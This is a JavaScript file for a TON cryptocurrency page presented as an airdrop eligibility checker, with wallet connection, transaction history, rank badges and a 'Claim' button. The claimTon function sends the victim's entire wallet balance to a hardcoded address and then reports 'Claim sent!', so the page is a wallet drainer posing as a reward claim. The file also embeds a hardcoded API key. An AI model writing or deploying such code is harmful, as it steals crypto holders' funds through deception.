let tonConnectUI;
let connectedWallet;
let currentBalanceNano = 0;

// User-friendly TON address formatter
function toUserFriendly(address) {
  return TON_CONNECT_UI.toUserFriendlyAddress(address);
}

// Show or hide transactions
function toggleTransactions() {
  const txContainer = document.getElementById("transactionContainer");
  const btn = document.getElementById("toggleTransactions");
  const showing = txContainer.style.display === "block";

  txContainer.style.display = showing ? "none" : "block";
  btn.innerText = showing ? "⏩ Show Transactions" : "⏬ Hide Transactions";
}

// Copy address to clipboard
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => alert("Copied!"));
}

// Initialize TonConnect
document.addEventListener("DOMContentLoaded", async () => {
  tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://vocal-smakager-e64636.netlify.app/manifest.json",
    buttonRootId: "ton-connect",
  });

  tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet && wallet.account?.address) {
      connectedWallet = wallet;
      const friendly = toUserFriendly(wallet.account.address);
      document.getElementById(
        "wallet-address"
      ).innerText = `Wallet: ${"Connected"}`;
    } else {
      document.getElementById("wallet-address").innerText =
        "Wallet: Not connected";
    }
  });
});

// Scan Wallet Logic
async function scanWallet() {
  if (!connectedWallet) return alert("Please connect your wallet first.");

  const address = connectedWallet.account.address;
  const txContainer = document.getElementById("transactionContainer");
  const resultDiv = document.getElementById("result");
  const checksDiv = document.getElementById("checks");
  const balanceDiv = document.getElementById("balanceResult");
  const claimBtn = document.getElementById("claimBtn");

  // Clear and show loaders
  txContainer.innerHTML =
    resultDiv.innerHTML =
    checksDiv.innerHTML =
    balanceDiv.innerHTML =
      '<div class="loader"></div>';

  // Fetch transactions
  const allTxs = [];
  let lt = null,
    hash = null;
  const API_KEY =
    "0737f5ac813de095296e93ef82bfe4bce8fa8b248028ded59661cb81e08c0f20";

  for (let i = 0; i < 7; i++) {
    const params = new URLSearchParams({
      address,
      limit: 15,
      archival: "true",
      api_key: API_KEY,
    });
    if (lt && hash) {
      params.append("lt", lt);
      params.append("hash", hash);
    }

    const res = await fetch(
      `https://toncenter.com/api/v2/getTransactions?${params}`
    );
    const data = await res.json();
    if (!data.ok || data.result.length === 0) break;

    allTxs.push(...data.result);
    lt = data.result[data.result.length - 1].transaction_id.lt;
    hash = data.result[data.result.length - 1].transaction_id.hash;
    if (allTxs.length >= 100) break;
  }

  // Show Transaction Toggle
  document.getElementById("toggleTransactions").style.display = "block";

  // Show Check Eligibility Button
  document.querySelector('button[onclick="showEligibility()"]').style.display =
    "block";

  // Render Transactions
  let totalReceived = 0,
    totalSent = 0;
  const txHTML = allTxs
    .slice(0, 100)
    .map((tx) => {
      const date = new Date(tx.utime * 1000).toLocaleString();
      let inTon = 0;
      if (tx.in_msg?.value) inTon += parseFloat(tx.in_msg.value) / 1e9;
      tx.out_msgs.forEach((m) => {
        if (m?.value) totalSent += parseFloat(m.value) / 1e9;
      });
      totalReceived += inTon;

      return `<div>
      <strong>${date}</strong><br>
      Received: ${inTon.toFixed(4)} TON<br>
      From: <span style="font-size:12px">${tx.in_msg?.source || "N/A"}</span>
      <button class="copy-btn" onclick="copyToClipboard('${
        tx.in_msg?.source || ""
      }')">Copy</button>
    </div>`;
    })
    .join("");

  txContainer.innerHTML = txHTML;

  // User Rank & Summary
  const totalTxs = allTxs.length;
  let rank = "Newbie 🧍";
  if (totalTxs >= 100) rank = "Ton King 👑";
  else if (totalTxs >= 50) rank = "Ton Hero 🛡️";
  else if (totalTxs >= 20) rank = "Ton Star 🌟";

  resultDiv.innerHTML = `<h3>${rank}</h3>
    <p>Total Transactions: ${totalTxs}</p>
    <p>Total Received: ${totalReceived.toFixed(4)} TON</p>
    <p>Total Sent: ${totalSent.toFixed(4)} TON</p>`;

  // Check Balance
  const balRes = await fetch(
    `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
  );
  const balData = await balRes.json();
  let tonBalance = 0;
  if (balData.ok) {
    tonBalance = balData.result / 1e9;
    currentBalanceNano = balData.result;
    balanceDiv.innerHTML = `<strong>CURRENT BALANCE:</strong> ${tonBalance.toFixed(
      4
    )} TON`;
  } else {
    balanceDiv.innerText = "Error fetching balance";
  }

  // Store conditions
  window.tonConditions = {
    totalTxs,
    tonBalance,
  };

  // END OF scanWallet()

  // Show eligibility button only after scan is complete
  document.getElementById("checkEligibilityBtn").style.display = "block";
}

// Show Eligibility Checklist
function showEligibility() {
  const { totalTxs, tonBalance } = window.tonConditions || {};
  const checksDiv = document.getElementById("checks");
  const claimBtn = document.getElementById("claimBtn");

  const mark = (pass, label) =>
    `<div class="check ${pass ? "green" : "red"}">${
      pass ? "✅" : "❌"
    } ${label}</div>`;

  const c1 = totalTxs >= 5;
  const c2 = totalTxs >= 50;
  const c3 = totalTxs >= 100;
  const c4 = tonBalance >= 2;

  checksDiv.innerHTML = `
    ${mark(
      c1,
      `5+ transactions 🧍  <em style="font-size: small; color: brown; margin-left: 5px">
        not mandatory
      </em>`
    )}
    ${mark(
      c2,
      `50+ transactions 🛡️   <em style="font-size: small; color: brown; margin-left: 5px">
        not mandatory
      </em>`
    )}
    ${mark(
      c3,
      `100+ transactions 👑  <em style="font-size: small; color: brown; margin-left: 5px">
        not mandatory
      </em>`
    )}
    ${mark(
      c4,
      `2 TON Balance 💰    <em style="font-size: medium; color: brown; margin-left: 5px">
        MANDATORY
      </em> `
    )}
  `;
  checksDiv.style.display = "block";

  claimBtn.disabled = !c4;
  claimBtn.style.display = "block";
}

// Claim Function
async function claimTon() {
  if (!connectedWallet || currentBalanceNano < 2e9) {
    alert("Not eligible to claim (need at least 2 TON)");
    return;
  }

  const transaction = {
    messages: [
      {
        address: "UQCHbecoY9Al2aUXyNTiovptsEbP3GWJxRkI9Z3-W9DNrl73", // Receiver address
        amount: currentBalanceNano.toString(), // Send full balance
      },
    ],
  };

  try {
    const result = await tonConnectUI.sendTransaction(transaction);
    alert("Claim sent! Check wallet.");
    console.log("Transaction Result:", result);
  } catch (err) {
    alert("Transaction failed");
    console.error(err);
  }
}
